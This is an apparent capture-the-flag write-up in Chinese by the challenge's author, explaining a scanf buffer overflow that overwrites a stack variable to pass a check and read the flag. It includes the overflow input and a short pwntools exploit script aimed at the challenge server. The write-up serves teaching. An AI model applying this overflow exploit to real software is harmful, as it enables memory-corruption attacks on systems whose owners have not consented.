# 可恶的scanf

## 出题意图

高程入门的时候，大家都遇到过MSVC默认配置不支持scanf的问题

那么为什么这样会存在安全问题呢，如果涉及到rop可能又太复杂，所以变量覆盖的难度刚刚好

## 解题思路

利用scanf读取不检查边界的问题，直接将变量覆盖

输入

```
aaaaaaaaaaaaaaaaCAca
```

即可变量覆盖，满足if的分支条件，读取flag

exp如下

```python
from pwn import *

io = remote("10.10.175.247", "33434")

# io = process("./docker/pwn")

delim = b"Please input the secret: \n"

payload = b"a"*16 + p32(0x61634143)

io.sendlineafter(delim, payload)

io.interactive()
```

